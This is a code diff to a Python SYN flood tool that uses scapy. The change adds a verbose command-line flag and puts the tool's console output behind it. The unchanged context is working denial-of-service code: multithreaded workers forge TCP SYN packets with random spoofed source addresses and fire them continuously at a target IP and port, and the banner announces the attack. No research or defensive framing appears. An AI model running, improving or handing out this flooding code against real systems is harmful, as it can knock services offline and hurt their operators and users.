@@ -34,8 +34,9 @@ def print_help():
     print("  -H or --host\tIP address of the server.")
     print("  -P or --port\tPort of the server.")
     print("  -T or --thread\tMultithread.")
+    print("  -V or --verbose\tVerbose mode")
     print("Example:")
-    print("  python3 %s -H TARGET_IP -P TARGET_PORT -T N_THREAD"
+    print("  python3 %s -H TARGET_IP -P TARGET_PORT -T N_THREAD -V IF_VERBOSE"
           % (sys.argv[0]))
     print()
 
@@ -49,7 +50,8 @@ def getopt(ARGS):
             exit(0)
     ret = {"host": TARGET_DEFAULT,
            "port": PORT_DEFAULT,
-           "thread": THREAD_DEFAULT}
+           "thread": THREAD_DEFAULT,
+           "verbose": True}
     for i in range(1, len(ARGS)):
         if i % 2 == 1:
             if ARGS[i] in ['-H', '--host']:
@@ -58,6 +60,11 @@ def getopt(ARGS):
                 ret['port'] = int(ARGS[i + 1])
             elif ARGS[i] in ['-T', '--thread']:
                 ret['thread'] = int(ARGS[i + 1])
+            elif ARGS[i] in ['-V', '--verbose']:
+                if ARGS[i + 1] == 'y':
+                    ret['verbose'] = True
+                else:
+                    ret['verbose'] = False
             else:
                 try:
                     assert False
@@ -71,11 +78,12 @@ class sendSYN(threading.Thread):
     THREAD = 0
     waiting_time = 0.5
 
-    def __init__(self, target, port):
+    def __init__(self, target, port, verbose=False):
         try:
             self.__target = target
             self.__port = port
             self.__id = sendSYN.THREAD
+            self.__verbose = verbose
             dice = random.randint(0, 9)
             if dice == 0:
                 self.__type = 0
@@ -84,14 +92,16 @@ class sendSYN(threading.Thread):
             sendSYN.THREAD += 1
             threading.Thread.__init__(self)
         except KeyboardInterrupt:
-            print("\nSYN flood attack ends!")
+            if self.__verbose:
+                print("\nSYN flood attack ends!")
             exit(0)
 
     def __del__(self):
         try:
             sendSYN.THREAD -= 1
         except KeyboardInterrupt:
-            print("\nSYN flood attack ends!")
+            if self.__verbose:
+                print("\nSYN flood attack ends!")
             exit(0)
 
     def run(self):
@@ -101,7 +111,8 @@ class sendSYN(threading.Thread):
                 t = sca.TCP()
                 ip_list = [random.randint(1, 254) for i in range(0, 4)]
                 port_rand = random.randint(2048, 65535)
-                # print ("\r%d threads running" % sendSYN.THREAD, end="")
+                if self.__verbose:
+                    print ("\r%d threads running" % sendSYN.THREAD, end="")
                 i.src = ("%i.%i.%i.%i" % (ip_list[0], ip_list[1], ip_list[2], ip_list[3]))
                 i.dst = self.__target
                 t.sport = port_rand
@@ -112,7 +123,8 @@ class sendSYN(threading.Thread):
                 t = sca.TCP()
                 time.sleep(sendSYN.waiting_time)
                 #ip_list = [random.randint(1, 254) for i in range(4)]
-                # print ("\r%d threads running" % sendSYN.THREAD, end="")
+                if self.__verbose:
+                    print ("\r%d threads running" % sendSYN.THREAD, end="")
                 i.src = ("%i.%i.%i.%i" % (ip_list[0], ip_list[1], ip_list[2], ip_list[3]))
                 i.dst = self.__target
                 t.sport = port_rand
@@ -128,40 +140,44 @@ class sendSYN(threading.Thread):
                 sock.close()
             return
         except  KeyboardInterrupt:
-            print("\nSYN flood attack ends!")
+            if self.__verbose:
+                print("\nSYN flood attack ends!")
             exit(0)
 
 
 if __name__ == "__main__":
 
     args = getopt(sys.argv)
-    print()
-    print("+--------------------------+")
-    print("|                          |")
-    print("|      SYN Flood           |")
-    print("|                          |")
-    print("|       by TakingOffPKU    |")
-    print("|                          |")
-    print("+--------------------------+")
-    print()
-    print("Host: %s" % args["host"])
-    print("Port: %d" % args["port"])
-    print("Thread: %d" % args["thread"])
-    print()
-    print("SYN flood attack will begin in")
+    if args['verbose'] == True:
+        print()
+        print("+--------------------------+")
+        print("|                          |")
+        print("|      SYN Flood           |")
+        print("|                          |")
+        print("|       by TakingOffPKU    |")
+        print("|                          |")
+        print("+--------------------------+")
+        print()
+        print("Host: %s" % args["host"])
+        print("Port: %d" % args["port"])
+        print("Thread: %d" % args["thread"])
+        print()
+        print("SYN flood attack will begin in")
     countdown = 5
     for i in range(countdown, 0, -1):
-        string = '\r'
-        for j in range(countdown, i - 1, -1):
-            string += str(j) + "..."
-        print(string, end="")
+        if args['verbose'] == True:
+            string = '\r'
+            for j in range(countdown, i - 1, -1):
+                string += str(j) + "..."
+            print(string, end="")
         time.sleep(1)
-    print("\nSYN flood attack begins!")
+    if args['verbose'] == True:
+        print("\nSYN flood attack begins!")
 
     while True:
         try:
             if sendSYN.THREAD <= args['thread']:
-                tmp = sendSYN(args['host'], args['port'])
+                tmp = sendSYN(args['host'], args['port'], args['verbose'])
                 tmp.start()
         except KeyboardInterrupt:
             print("\nSYN flood attack ends!")
